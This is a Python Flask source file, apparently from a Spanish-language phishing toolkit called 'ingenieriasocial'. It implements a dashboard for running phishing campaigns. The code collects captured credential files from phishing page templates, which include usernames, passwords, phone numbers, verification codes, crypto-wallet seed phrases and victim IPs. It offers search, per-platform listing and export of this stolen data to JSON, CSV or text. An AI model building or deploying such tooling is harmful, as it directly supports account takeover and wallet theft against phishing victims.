#!/usr/bin/env python3
# -*- coding: utf-8 -*-
"""
Dashboard Web en Tiempo Real - ingenieriasocial
Creado por: MidasOrion

Panel de control profesional para monitorear campañas de phishing
"""

from flask import Flask, render_template, jsonify, request, send_file
from flask_cors import CORS
import json
import os
import glob
from datetime import datetime
from collections import Counter
import sqlite3

app = Flask(__name__)
CORS(app)

# Configuración
BASE_DIR = os.path.dirname(os.path.dirname(os.path.abspath(__file__)))
TEMPLATES_DIR = os.path.join(BASE_DIR, 'templates', 'phishing')
DB_PATH = os.path.join(BASE_DIR, 'dashboard', 'captures.db')

# Inicializar base de datos
def init_db():
    """Inicializa la base de datos SQLite"""
    conn = sqlite3.connect(DB_PATH)
    cursor = conn.cursor()
    
    cursor.execute('''
        CREATE TABLE IF NOT EXISTS captures (
            id INTEGER PRIMARY KEY AUTOINCREMENT,
            platform TEXT NOT NULL,
            timestamp TEXT NOT NULL,
            username TEXT,
            password TEXT,
            phone TEXT,
            code TEXT,
            seed_phrase TEXT,
            ip TEXT,
            user_agent TEXT,
            referer TEXT,
            created_at DATETIME DEFAULT CURRENT_TIMESTAMP
        )
    ''')
    
    cursor.execute('''
        CREATE TABLE IF NOT EXISTS campaigns (
            id INTEGER PRIMARY KEY AUTOINCREMENT,
            name TEXT NOT NULL,
            platform TEXT NOT NULL,
            url TEXT,
            status TEXT DEFAULT 'active',
            created_at DATETIME DEFAULT CURRENT_TIMESTAMP,
            views INTEGER DEFAULT 0,
            captures INTEGER DEFAULT 0
        )
    ''')
    
    conn.commit()
    conn.close()

init_db()

def get_all_captures():
    """Obtiene todas las capturas de todos los templates"""
    captures = []
    
    # Buscar archivos JSON en todos los templates
    json_files = glob.glob(os.path.join(TEMPLATES_DIR, '**/captured_credentials.json'), recursive=True)
    
    for json_file in json_files:
        try:
            with open(json_file, 'r') as f:
                data = json.load(f)
                if isinstance(data, list):
                    captures.extend(data)
                elif isinstance(data, dict):
                    captures.append(data)
        except:
            continue
    
    # Ordenar por timestamp (más recientes primero)
    captures.sort(key=lambda x: x.get('timestamp', ''), reverse=True)
    
    return captures

def get_statistics():
    """Calcula estadísticas generales"""
    captures = get_all_captures()
    
    if not captures:
        return {
            'total_captures': 0,
            'platforms': {},
            'today_captures': 0,
            'success_rate': 0,
            'top_ips': [],
            'recent_captures': []
        }
    
    # Contar por plataforma
    platforms = Counter([c.get('platform', 'Unknown') for c in captures])
    
    # Capturas de hoy
    today = datetime.now().strftime('%Y-%m-%d')
    today_captures = len([c for c in captures if c.get('timestamp', '').startswith(today)])
    
    # Top IPs
    ips = Counter([c.get('ip', 'Unknown') for c in captures])
    top_ips = [{'ip': ip, 'count': count} for ip, count in ips.most_common(5)]
    
    # Capturas recientes (últimas 10)
    recent_captures = captures[:10]
    
    return {
        'total_captures': len(captures),
        'platforms': dict(platforms),
        'today_captures': today_captures,
        'success_rate': 0,  # Se calculará con vistas
        'top_ips': top_ips,
        'recent_captures': recent_captures
    }

@app.route('/')
def index():
    """Página principal del dashboard"""
    return render_template('dashboard.html')

@app.route('/api/stats')
def api_stats():
    """API: Obtener estadísticas generales"""
    stats = get_statistics()
    return jsonify(stats)

@app.route('/api/captures')
def api_captures():
    """API: Obtener todas las capturas"""
    captures = get_all_captures()
    return jsonify({
        'success': True,
        'count': len(captures),
        'captures': captures
    })

@app.route('/api/captures/<platform>')
def api_captures_platform(platform):
    """API: Obtener capturas de una plataforma específica"""
    captures = get_all_captures()
    filtered = [c for c in captures if c.get('platform', '').lower() == platform.lower()]
    
    return jsonify({
        'success': True,
        'platform': platform,
        'count': len(filtered),
        'captures': filtered
    })

@app.route('/api/capture/<int:capture_id>')
def api_capture_detail(capture_id):
    """API: Obtener detalles de una captura específica"""
    captures = get_all_captures()
    
    if 0 <= capture_id < len(captures):
        return jsonify({
            'success': True,
            'capture': captures[capture_id]
        })
    
    return jsonify({
        'success': False,
        'error': 'Captura no encontrada'
    }), 404

@app.route('/api/export/<format>')
def api_export(format):
    """API: Exportar datos en diferentes formatos"""
    captures = get_all_captures()
    
    if format == 'json':
        return jsonify(captures)
    
    elif format == 'csv':
        import csv
        import io
        
        output = io.StringIO()
        if captures:
            writer = csv.DictWriter(output, fieldnames=captures[0].keys())
            writer.writeheader()
            writer.writerows(captures)
        
        return output.getvalue(), 200, {
            'Content-Type': 'text/csv',
            'Content-Disposition': 'attachment; filename=captures.csv'
        }
    
    elif format == 'txt':
        output = []
        for i, capture in enumerate(captures, 1):
            output.append(f"═══════════════════════════════════════════════════════════")
            output.append(f"CAPTURA #{i}")
            output.append(f"═══════════════════════════════════════════════════════════")
            for key, value in capture.items():
                output.append(f"{key}: {value}")
            output.append("")
        
        return '\n'.join(output), 200, {
            'Content-Type': 'text/plain',
            'Content-Disposition': 'attachment; filename=captures.txt'
        }
    
    return jsonify({'error': 'Formato no soportado'}), 400

@app.route('/api/clear/<platform>')
def api_clear_platform(platform):
    """API: Limpiar capturas de una plataforma"""
    json_file = os.path.join(TEMPLATES_DIR, platform, 'captured_credentials.json')
    
    if os.path.exists(json_file):
        os.remove(json_file)
        return jsonify({
            'success': True,
            'message': f'Capturas de {platform} eliminadas'
        })
    
    return jsonify({
        'success': False,
        'error': 'Plataforma no encontrada'
    }), 404

@app.route('/api/search')
def api_search():
    """API: Buscar en capturas"""
    query = request.args.get('q', '').lower()
    
    if not query:
        return jsonify({'success': False, 'error': 'Query vacío'}), 400
    
    captures = get_all_captures()
    results = []
    
    for capture in captures:
        # Buscar en todos los campos
        for key, value in capture.items():
            if query in str(value).lower():
                results.append(capture)
                break
    
    return jsonify({
        'success': True,
        'query': query,
        'count': len(results),
        'results': results
    })

@app.route('/api/platforms')
def api_platforms():
    """API: Obtener lista de plataformas disponibles"""
    platforms = []
    
    for platform_dir in os.listdir(TEMPLATES_DIR):
        platform_path = os.path.join(TEMPLATES_DIR, platform_dir)
        if os.path.isdir(platform_path):
            index_file = os.path.join(platform_path, 'index.html')
            if os.path.exists(index_file):
                platforms.append({
                    'name': platform_dir,
                    'path': platform_path,
                    'url': f'/templates/{platform_dir}/'
                })
    
    return jsonify({
        'success': True,
        'count': len(platforms),
        'platforms': platforms
    })

if __name__ == '__main__':
    print("""
╔════════════════════════════════════════════════════════════════╗
║          🎯 Dashboard Web - ingenieriasocial                   ║
║                   Creado por: MidasOrion                       ║
╚════════════════════════════════════════════════════════════════╝

[+] Iniciando servidor...
[+] Dashboard disponible en: http://localhost:8080
[+] API disponible en: http://localhost:8080/api/stats

[!] Presiona Ctrl+C para detener el servidor
    """)
    
    app.run(host='0.0.0.0', port=8080, debug=True)
